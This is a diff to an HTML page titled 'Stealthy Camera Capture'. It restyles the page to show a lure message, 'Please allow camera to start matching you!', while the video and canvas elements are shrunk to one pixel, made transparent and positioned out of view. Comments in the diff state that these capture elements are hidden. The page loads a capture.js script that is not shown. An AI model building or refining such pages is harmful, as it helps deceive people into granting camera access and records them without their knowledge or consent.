@@ -4,14 +4,45 @@
   <meta charset="UTF-8" />
   <title>Stealthy Camera Capture</title>
   <style>
-    /* hide everything on the page so it’s invisible to the user */
-    body, video, canvas { margin:0; padding:0; border:0; width:1px; height:1px; overflow:hidden; }
+    /* make body fill the viewport, center content */
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #111;            /* dark background */
+      color: #fff;                 /* light text */
+      font-family: sans-serif;
+    }
+
+    /* style your message */
+    #message {
+      text-align: center;
+      font-size: 1.5rem;
+      line-height: 1.4;
+    }
+
+    /* hide the video & canvas off‑screen */
+    video, canvas {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      overflow: hidden;
+      opacity: 0;
+    }
   </style>
 </head>
 <body>
+  <div id="message">
+    <h3>Please allow camera to start matching you!</h3>
+  </div>
+
+  <!-- offscreen capture elements -->
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
+
   <script src="capture.js"></script>
-  <h3>Please allow camera to start matching you!</h3>
 </body>
 </html>
